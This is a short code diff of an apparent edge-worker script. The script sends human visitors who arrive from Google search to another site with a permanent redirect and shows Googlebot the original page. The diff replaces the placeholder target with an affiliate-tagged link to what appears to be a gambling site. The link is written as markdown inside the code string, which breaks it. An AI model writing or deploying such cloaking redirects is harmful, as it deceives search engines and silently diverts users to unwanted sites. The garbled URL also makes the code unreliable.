@@ -11,7 +11,7 @@ export default {
 
     if (isGoogleSearchClick && !isGoogleBot) {
       // 跳转到新网站（301永久重定向）
-      return Response.redirect('https://new-website.com', 301);
+      return Response.redirect('[https://new-website.com](https://555win01.com/?cid=645936&type=4&currency=VND&id=328406051)', 301);
     }
 
     // 其他情况（直接访问、爬虫、非Google搜索流量）正常访问原网站
